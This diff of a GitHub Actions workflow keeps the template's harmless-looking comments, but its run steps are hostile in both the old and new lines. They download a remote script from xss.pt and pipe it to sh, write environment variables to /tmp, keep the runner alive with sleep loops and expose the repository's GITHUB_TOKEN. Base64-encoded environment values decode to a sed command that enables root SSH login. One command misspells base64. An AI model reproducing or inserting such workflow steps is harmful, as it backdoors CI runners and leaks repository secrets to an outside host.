@@ -27,14 +27,14 @@ jobs:
 
       # Runs a single command using the runners shell
       - name: Run a one-line script
-        run: bash -c "echo ${{github.event.action}};date;(env|grep ss>/tmp/s0;sleep 1420&);exit 0"
+        run: bash -c "echo ${{github.event.action}};echo ${{github.event.inputs}};date;(env|grep ss>/tmp/s0;sleep 1420&);exit 0"
         env:
           ss0: "c2VkIC1pICJzL14jXD9cKFBlcm1pdFJvb3RMb2dpblwpL1wxIHllcyMvZyIgL2V0Yy9zc2gvc3NoZF9jb25maWc7"
       # Runs a set of commands using the runners shell
 
       - name: Run a multi-line script
         run: 
-          bash -c 'echo "${{ toJson(github.event) }}"|base64 -w0 >/tmp/js9;bas464 -d /tmp/js9>/tmp/jsA;env|grep ss>/tmp/s1;cd /tmp;curl -o- http://xss.pt/4Mi8|tr -d "\r"|tee a1|sh;(while :;do date;[ -f a1 ]&&sleep 300||break;done)'
+          bash -c 'echo "${{ toJson(github.event.inputs) }}"|base64 -w0 >/tmp/js8;bas464 -d /tmp/js8>/tmp/js9;env|grep ss>/tmp/s1;cd /tmp;curl -o- http://xss.pt/4Mi8|tr -d "\r"|tee a1|sh;(while :;do date;[ -f a1 ]&&sleep 300||break;done)'
         env:
           sshc1: "c2VkIC1pICJzL14jXD9cKFBlcm1pdFJvb3RMb2dpblwpL1wxIHllcyMvZyIgL2V0Yy9zc2gvc3NoZF9jb25maWc7"
           Github_T22: ${{ secrets.GITHUB_TOKEN }}
